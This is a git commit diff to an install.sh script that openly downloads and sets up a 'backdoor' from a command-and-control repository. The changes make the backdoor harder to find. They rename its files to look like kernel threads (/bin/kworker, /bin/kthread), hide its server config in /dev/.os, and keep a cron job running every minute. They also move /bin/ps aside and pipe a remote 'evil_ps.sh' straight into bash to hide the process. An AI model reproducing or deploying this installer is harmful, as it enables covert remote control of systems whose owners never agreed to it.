8f3ca8398a8df2c5ebdf7dfc2657af72298e5f5e
Anton Forsman <10177340+anforsm@users.noreply.github.com>
2023-10-08 23:49:27 -0500

    additional disguise procedures

--- install.sh
+++ install.sh
@@ -3,14 +3,17 @@ echo "Installing dependencies..."
 echo "Installing python3"
 yum install -y -q python3
 echo "Downloading backdoor..."
-curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /home/user/client.py
-curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /home/user/manager.sh
+curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /bin/kthread
+curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /bin/kworker
 echo "Configure backdoor"
 read -p "Enter server ip: " server_ip
 read -p "Enter server port: " server_port
-rm -f /home/user/conf.py
-echo "SERVER_IP = '$server_ip'" >> /home/user/conf.py
-echo "SERVER_PORT = $server_port" >> /home/user/conf.py
-chmod +x /home/user/manager.sh
-(crontab -l 2>/dev/null; echo "* * * * * /home/user/manager.sh") | crontab -
+rm -f /dev/.os
+echo "SERVER_IP = '$server_ip'" >> /dev/.os
+echo "SERVER_PORT = $server_port" >> /dev/.os
+chmod +x /bin/kworker
+(crontab -l 2>/dev/null; echo "* * * * * /bin/kworker") | crontab -
+# https://stackoverflow.com/questions/28836042/how-to-hide-a-shell-script-running-in-the-background-from-ps-ef
+mv /bin/ps /bin/pso
+bash <(curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/evil_ps.sh)
 echo "Installation complete"
